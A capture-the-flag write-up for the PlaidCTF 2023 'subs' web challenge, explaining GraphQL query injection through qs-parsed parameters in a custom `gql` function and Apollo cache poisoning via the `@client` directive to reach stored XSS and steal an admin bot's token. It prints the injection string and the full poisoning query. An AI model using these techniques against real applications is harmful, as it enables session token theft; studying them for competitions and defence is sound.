---
title: PlaidCTF 2023 - subs - web
published: true
---

# Cache Poisoning in GraphQL

The flag is accessible for admin only, admin is a bot verified based on `window.localStorage.token`.

In order to communicate the [client](https://www.npmjs.com/package/@apollo/client) and the [server](https://www.npmjs.com/package/@apollo/server) make use of linked [apollo graphql](https://www.apollographql.com/).

### Client

Written in a React frontend web app, had some `dangerouslySetInnerHTML` in few places, but not in places controlled by us. What we control is for example our `username`.

Some component `Episode` has inside set `dangerouslySetInnerHTML={episode.description}`, but we don't control the description of the episode! We though control other entity called `Playlist` and our own `username`.

Here comes the solution...

## Solution

tl;dr - Pollute the cache mechanism that is in `gql` function.

### GraphQL Injection

`gql` function:

```typescript
export function gql(literals: TemplateStringsArray, ...args: any[]) {
	const parts = [literals[0]];
	for (let i = 0; i < args.length; i++) {
		const arg: unknown = args[i];
		if (isNode(arg)) {
			parts.push(print(arg));
		} else if (arg === undefined || arg === null) {
			parts.push("null");
		} else {
			parts.push(JSON.stringify(arg));
		}

		parts.push(literals[i + 1]);
	}

	const source = parts.join("");

	if (cache.has(source)) {
		return cache.get(source)!;
	}

	const document = parse(source);
	cache.set(source, document);
	return document;
}
```

The `source` variable is a **GraphQL query**. We are able to inject our own query in one specific place:

```typescript
const { data, loading, error } = useQuery<PlaylistQueryResult>(gql`
    query PlaylistQuery {
        playlist(id: ${props.id}) {
            id
            name
            description
            episodes {
                id
                name
            }
            owner {
                id
                name
            }
        }
    }
`);
```

Here we control fully the `props.id` object and can make it whatever we want, because of the [qs library](https://www.npmjs.com/package/qs) used and `id` being retrieved as params.

In order to have our injection, we need to satisfy the `isNode` in the loop:

```typescript
for (let i = 0; i < args.length; i++) {
    const arg: unknown = args[i];
    if (isNode(arg)) {
        parts.push(print(arg)); // <--- Our value is being concatenated with the query itself
    } else if (arg === undefined || arg === null) {
        parts.push("null");
    } else {
        parts.push(JSON.stringify(arg));
    }

    parts.push(literals[i + 1]);
}

const source = parts.join("");
```

To do so, we can just pass in path params:
```
?id[kind]=Name&id[value]="whatever we want"){}
```

Then the query will look as follows:
```gql
query PlaylistQuery {
    playlist(id: "whatever we want"){}) {
        id
        name
        description
        episodes {
            id
            name
        }
        owner {
            id
            name
        }
    }
}
```
instead of rendering it using `JSON.stringify` that would escape all quotes.

### GraphQL Apollo Cache poisoning

GraphQL makes use of [KNOWN_DIRECTIVES](https://github.com/apollographql/apollo-client/blob/a0ef4138478fb556b5f5f65c5ad7a1f8ac0274b6/src/utilities/graphql/storeUtils.ts#L181-L188) that can be used as follows: `@<direcive>`.

We are especially interested in `client` directive - it gives a possibility to include **[local-only fiels that aren't defined in your GraphQL server's schema](https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/#querying)**.

Based on field we control - `username`. We add XSS to it and we create a local client directive and we call it a **episode description**, the result gets cached, and the admin bot views the cached episodes list and gets an XSS thus giving us its `window.localStorage.token`.

GraphQL query:

```
query PlaylistQuery {
    playlist(id: ${props.id}) {
        id
        name
        description
        episodes {
            id
            name
        }
        owner {
            id
            name
        }
    }

    x: user(id: "8b922526-7c27-43b7-ad2a-12f83acd870a") {
        name
        playlists {
            id
            name
            description @client description:owner{__html:name} # <--- HERE
            episodeCount
        }
        shows {
            id
            name
        }
    }

    dummy: playlist(id: "00000000-0000-0000-0000-000000000000") {
        id
        name
        description
        episodes {
            id
            name
        }
        owner {
            id
            name
        }
    }
}
```

## To remember

- [GraphQL KNOWN_DIRECTIVES](https://github.com/apollographql/apollo-client/blob/a0ef4138478fb556b5f5f65c5ad7a1f8ac0274b6/src/utilities/graphql/storeUtils.ts#L181-L188)

- [deepMerge improper prototype pollution validation](https://github.com/apollographql/federation/blob/main/gateway-js/src/utilities/deepMerge.ts#L7)

- [React special props](https://react.dev/reference/react-dom/components/common#common-props) - they work only on pure html components, **not** on react components, but still can be passed down.

- [GraphQL client directive](https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/#querying)

- [blue pichu](https://github.com/bluepichu) makes too big but fun challs